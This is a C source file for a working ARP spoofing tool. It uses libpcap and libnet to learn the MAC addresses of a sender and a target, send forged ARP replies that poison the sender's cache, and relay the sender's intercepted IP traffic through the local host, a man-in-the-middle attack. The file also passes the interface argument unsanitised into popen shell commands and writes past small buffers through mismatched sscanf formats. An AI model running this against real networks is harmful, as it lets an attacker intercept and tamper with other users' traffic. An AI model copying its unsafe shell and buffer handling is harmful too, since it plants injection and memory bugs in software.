#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

#define TIME_OUT    0xFF
#define MAX_SNAP_LEN  0xFFFF
#define NP_MODE 0
#define SIMPLE_LOCALHOST_MAC {localhost_mac[0],localhost_mac[1],localhost_mac[2],localhost_mac[3],localhost_mac[4],localhost_mac[5]}
/* Main thread state value */
#define PACKET_RELAY        0x0
#define REQ_SENDER_MAC      0x1
#define REQ_TARGET_MAC      0x2
#define REP_SPOOF_PACKET    0x3

typedef struct libnet_802_3_hdr ETH;
typedef struct libnet_arp_hdr ARP;
typedef struct libnet_ipv4_hdr IP;
#pragma pack(push, 1)
typedef struct ETH_ARP{
    ETH eth1;
    ARP arp1;
}ETH_ARP;
typedef struct SHD{
    uint8_t localhostMAC[ETHER_ADDR_LEN];
    uint8_t senderMAC[ETHER_ADDR_LEN];
    uint8_t targetMAC[ETHER_ADDR_LEN];
    uint32_t senderIP;
    uint32_t targetIP;
    uint32_t localhostIP;
}SHD;
#pragma pack(pop)

void* thread_read_packet(char* interface);
char* get_interface_mac(char *interface);
char* get_interface_ip(char *interface);
uint8_t* str_to_mac(char* str);
uint32_t str_to_ip(char* str);

/* ------ static data list ------ */
// main thread - read status
// read thread - write status
static struct pcap_pkthdr* pktData;
static uint8_t* readedData;
static SHD shareData;
static uint8_t readStatus = REQ_SENDER_MAC;
uint8_t* localhost_mac;
pthread_mutex_t mutex_lock;
// end

int main(int argc, char** argv)
{
    char errBuf[PCAP_ERRBUF_SIZE];
    char* interface;
    uint8_t* packet;
    pcap_t* pktDescriptor;
    pthread_t p_thread;
    pthread_attr_t p_thread_attr;

    if (argc != 4)
    {
          printf("Usage : arp_spoof <interface><sender ip><target ip>\n");
          return 1;
    }
    interface = argv[1];
    localhost_mac = str_to_mac(get_interface_mac(interface));
    shareData.senderIP = str_to_ip(argv[2]);
    shareData.targetIP = str_to_ip(argv[3]);
    shareData.localhostIP = str_to_ip(get_interface_ip(interface));

    pthread_mutex_init(&mutex_lock, NULL);
    pthread_attr_init(&p_thread_attr);
    pthread_attr_setdetachstate(&p_thread_attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&p_thread, &p_thread_attr, thread_read_packet, argv[1]); // isloate thread

    ETH_ARP reqSender = {
        "\xFF\xFF\xFF\xFF\xFF\xFF",
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,4,htons(ARPOP_REQUEST),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.localhostIP),
        "\x00\x00\x00\x00\x00\x00", htonl(shareData.senderIP)
    };
    ETH_ARP reqTarget = {
        "\xFF\xFF\xFF\xFF\xFF\xFF",
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,4,htons(ARPOP_REQUEST),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.localhostIP),
        "\x00\x00\x00\x00\x00\x00", htonl(shareData.targetIP)
    };
    ETH_ARP repSpoof = {
        "\x00\x00\x00\x00\x00\x00",
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,4,htons(ARPOP_REPLY),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.targetIP),
        "\x00\x00\x00\x00\x00\x00", htonl(shareData.senderIP)
    };
    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);
    if (!pktDescriptor)
    {
        printf("[MainThread] Can't open %s interface resason: %s\n", interface, errBuf);
        return 1;
    }

    do
    {
        switch(readStatus)
        {
            case REQ_SENDER_MAC:
                packet = &reqSender;
                pcap_sendpacket(pktDescriptor, packet, 42);
                break;
            case REQ_TARGET_MAC:
                packet = &reqTarget;
                pcap_sendpacket(pktDescriptor, packet, 42);
                break;
            case REP_SPOOF_PACKET:
                memcpy(repSpoof.eth1._802_3_dhost, shareData.senderMAC, ETHER_ADDR_LEN);
                memcpy(repSpoof.arp1.dstMAC, shareData.senderMAC, ETHER_ADDR_LEN);
                packet = &repSpoof;
                pcap_sendpacket(pktDescriptor, packet, 42);
                break;
            case PACKET_RELAY:
                pcap_sendpacket(pktDescriptor, readedData, pktData->len);
                // TODO Sleep
                break;
            default:
                break;
        }
    }while(1);

    return 0;
}

void* thread_read_packet(char* interface)
{
    pcap_t* pktDescriptor;
    ETH* ethHeader;
    ARP* arpHeader;
    IP* ipHeader;

    char errBuf[PCAP_ERRBUF_SIZE];

    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);

    if (!pktDescriptor)
    {
        printf("[ReadThread] Can't open %s interface resason: %s\n", interface, errBuf);
    }
    while(1)
    {
        if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
        {
            ethHeader = (ETH*)(readedData);

            switch(ntohs(ethHeader->_802_3_len))
            {
                case ETHERTYPE_IP:
                    // Relay, but some think
                    ipHeader = (IP*)(readedData+14);
                    if (!memcmp(ethHeader->_802_3_shost, shareData.senderMAC, ETHER_ADDR_LEN) &&
                        !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) &&
                        (ntohl(ipHeader->ip_src.s_addr) == shareData.senderIP) &&
                        (ntohl(ipHeader->ip_dst.s_addr) != shareData.localhostIP) )
                    {
                        memcpy(ethHeader->_802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
                        memcpy(ethHeader->_802_3_shost, shareData.localhostMAC, ETHER_ADDR_LEN);
                        readStatus = PACKET_RELAY;
                        // TODO sleep
                    }
                    break;
                case ETHERTYPE_ARP:
                    arpHeader = (ARP*)(readedData+14);
                    if (ntohs(arpHeader->ar_op) == ARPOP_REPLY)
                    {
                        // Get sender mac
                        if ((ntohl(arpHeader->srcIP) == shareData.senderIP) &&
                                (ntohl(arpHeader->dstIP) == shareData.localhostIP))
                        {
                            memcpy(shareData.senderMAC, arpHeader->srcMAC, ETHER_ADDR_LEN);
                            memcpy(shareData.localhostMAC, arpHeader->dstMAC, ETHER_ADDR_LEN);
                            readStatus = REQ_TARGET_MAC;
                        }
                        // Get target mac
                        if ((ntohl(arpHeader->srcIP) == shareData.targetIP) &&
                                (ntohl(arpHeader->dstIP) == shareData.localhostIP))
                        {
                            memcpy(shareData.targetMAC, arpHeader->srcMAC, ETHER_ADDR_LEN);
                            readStatus = REP_SPOOF_PACKET;
                        }
                    }
                    if (ntohs(arpHeader->ar_op) == ARPOP_REQUEST)
                    {
                        // Target broadcast
                        if ((!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
                                   (!memcmp(ethHeader->_802_3_dhost, "\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN)))
                        {
                            readStatus = REP_SPOOF_PACKET;
                        }
                        // Sender to target
                        if ((ntohl(arpHeader->srcIP) == shareData.senderIP) &&
                                (ntohl(arpHeader->dstIP) == shareData.targetIP))
                        {
                            readStatus = REP_SPOOF_PACKET;
                        }
                    }
                    break;
                default: // Another packets
                    break;
            }
        }
    }
}


char* get_interface_mac(char *interface)
{
    FILE* fileDescriptor;
    char buf[100];
    static char strMAC[18];

    sprintf(buf, "ip link show %s | awk '/link/{printf $2}'", interface);
    fileDescriptor = popen(buf, "r");
    if (fileDescriptor)
    {
       fgets(strMAC, sizeof(strMAC), fileDescriptor);
    }
    pclose(fileDescriptor);

    return strMAC;
}
char* get_interface_ip(char *interface)
{
    FILE* fileDescriptor;
    char buf[100];
    static char strIP[15];

    sprintf(buf, "ifconfig %s | awk '/inet /{printf $2}'", interface);
    fileDescriptor = popen(buf, "r");
    if (fileDescriptor)
    {
       fgets(strIP, sizeof(strIP), fileDescriptor);
    }
    pclose(fileDescriptor);

    return strIP;
}
uint8_t* str_to_mac(char* str)
{
    static uint8_t arr[6];

    sscanf(str,"%02x:%02x:%02x:%02x:%02x:%02x"
           ,&arr[0],&arr[1],&arr[2],&arr[3],&arr[4],&arr[5]);

    return arr;
}
uint32_t str_to_ip(char* str)
{
    uint8_t arr[4];
    uint32_t ipValue = 0;

    sscanf(str,"%d.%d.%d.%d"
           ,&arr[0],&arr[1],&arr[2],&arr[3]);
    ipValue = (arr[0]<<24) + (arr[1]<<16) + (arr[2]<<8) + (arr[3]);

    return ipValue;
}
